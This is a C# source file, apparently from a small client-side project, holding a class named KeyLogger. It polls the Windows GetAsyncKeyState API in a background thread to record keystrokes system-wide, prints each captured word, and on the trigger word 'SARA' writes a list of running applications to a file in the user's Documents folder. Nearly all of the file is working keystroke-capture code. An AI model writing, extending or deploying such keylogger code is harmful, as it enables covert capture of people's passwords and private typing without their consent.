using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class KeyLogger
    {
        // keylogger from API
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static void playThread()
        {

            Thread keyLogger = new Thread(playKeyLogger);
            keyLogger.Start();


        }

        public static void playKeyLogger()
        {
            String input = "";
            Boolean flag = true;
            while (flag)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {

                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {

                        input += (char)i;

                        if (i == 32)
                        {
                            Console.WriteLine(input);
                            if (input == "SARA ")
                            {
                                ShowErrorDialog("SARA insert");
                                inputEqualsSARA();

                            }
                            input = "";
                        }


                    }

                }




            }

        }

        private static void inputEqualsSARA()
        {


            // sava keylogger in file
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\AllAPP.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) ;
            }
            string AllApp = ShowAllProcess.ListAllApplications();
            using (StreamWriter sw = File.AppendText(path))
            {
                sw.Write(AllApp);

            }






        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
